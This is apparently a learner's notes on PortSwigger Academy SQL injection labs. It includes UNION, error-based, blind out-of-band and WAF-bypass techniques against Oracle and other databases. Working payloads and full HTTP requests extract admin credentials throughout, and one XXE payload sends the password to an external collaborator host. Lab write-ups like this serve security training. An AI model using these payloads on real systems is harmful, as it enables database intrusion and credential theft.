# Challenges
## SQL injection attack, listing the database contents on Oracle
In the Shop app, get logged in as Administrator using the SQLi vulnerability. 
## Observations
- Server errors out on a single quote to the Categories filter param. 
- Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

```'+UNION+SELECT+'abc','def'+FROM+dual--```
- Use the following payload to retrieve the list of tables in the database:

```'+UNION+SELECT+table_name,NULL+FROM+all_tables--```
- Find the name of the table containing user credentials.
Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

```'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ADBYJT'--```
- Find the names of the columns containing usernames and passwords.
Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

```'+UNION+SELECT+USERNAME_ADGIOH,+PASSWORD_DXIGSJ+FROM+USERS_ABCDEF-- ```

Final payload:
```GET /filter?category=Gifts%27%20UNION%20SELECT%20USERNAME_ADGIOH,PASSWORD_DXIGSJ+FROM+USERS_ADBYJT--```
Find the password for the administrator user, and use it to log in.

## Visible error-based SQL injection
In the Shop app, get the administrator username and password. 
## Observations
- The TrackingId cookie is vulnerable to SQLi. 
- There is only 1 column:
```
GET /filter?category=Gifts HTTP/2
Host: 0ac100860458d22081a92fdb004300d4.web-security-academy.net
Cookie: TrackingId=TynCM5K6RLRKdCPa'+ORDER+BY+1--; session=rzBGt19n6jve3MMgkapeHCTeDfGy3NpX
```
- Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:

```TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--```
Send the request. Observe that you now get a different error saying that an AND condition must be a boolean expression.

- Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows:

```TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--```
Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.

- Adapt your generic SELECT statement so that it retrieves usernames from the database:

```TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--```
Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.

- Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request.

```TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--```
Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.

- Modify the query to return only one row:

```TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--```

```
Cookie: TrackingId=T' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--; session=rzBGt19n6jve3MMgkapeHCTeDfGy3NpX
```
Send the request. Observe that the error message now leaks the first username from the users table:

ERROR: invalid input syntax for type integer: "administrator"

- Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:

```TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--```

```
GET /filter?category=Gifts HTTP/2
Host: 0ac100860458d22081a92fdb004300d4.web-security-academy.net
Cookie: TrackingId=T' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--; session=rzBGt19n6jve3MMgkapeHCTeDfGy3NpX
```
- Log in as administrator using the stolen password to solve the lab.

# Blind SQL injection with out-of-band interaction
Get a DNS lookup to BurpCollaborator via the SQLi.
## Observations
No clear vulnerabilities. There is a TrackingId cookie so it may be in that but it doesn't seem to change the behavior of the application. 

- Oracle payload to get OOB interaction:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0a8a003c030d338e828b8deb004c0055.web-security-academy.net
Cookie: TrackingId=pdPF94XVSqyqI0Ts'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//wllxdgwpnw3dop9t2v2lbwp2vt1kpbd0.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--; session=LKe7iMf5zWDWrruDj7hwS1HSi6f1yIyz
```

# Blind SQL injection with out-of-band data exfiltration
In this challenge, the goal is to get the username and password for administrator using the OOB server. 

It is very similar to the above challenge so we'll just redo that but modify the payload to append the necessary information to the request to collaborator:

- Start with this payload to confirm OOB interaction:
```
'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//5696yphy85om9yu2n4nuw5abg2mtamyb.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--
```
- Then we need to actuall extract data. We do this by modifying the payload to include information from the users table. To do that, we prepend the select statement to the OOB URL:
``` '||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||' ```
So the total payload looks like this:
```
GET / HTTP/2
Host: 0ad6003b03dee4e48084082400a000b3.web-security-academy.net
Cookie: TrackingId=NZabXq0UXiDJYBCi'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'5696yphy85om9yu2n4nuw5abg2mtamyb.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--; session=lGNWfFh61OTxKMmsh25Ka9MeoYPdMbtl
```
Just the payload:
```
'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'5696yphy85om9yu2n4nuw5abg2mtamyb.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--
```
The password is prepended to the Hostname in the request. Use that to log in, solved. 

BTW BurpSuite Pro Scanner will find this OOB which is hard because I haven't found a real easy way to see it without that. 

# SQL Injection with filter bypass via XML Encoding
The goal of this challenge is to get the admin's credentials and log into their account via the SQLi. 
## Observations
- Very much unlike the other SQLi labs. This one appears to be within the XML of the product lookup API requests which is cool. 
- Adding a single quote to the value of the productId threw an "attack detected" error. So, we'll try to subvert that logic to get through. 
- Screwed around on ProductId for a while, while it does prompt the WAF, its not the vulnerable function. It is StoreID. Using Hackverter and hex_entities encoding I coud get the column with ```1 UNION SELECT NULL``` There isn't a second column, throws a zero "error". 
- Need to concatenant the username and password columns since we can only retrieve one, or do them separately. 
```
1 UNION SELECT username || '~' || password FROM users
```
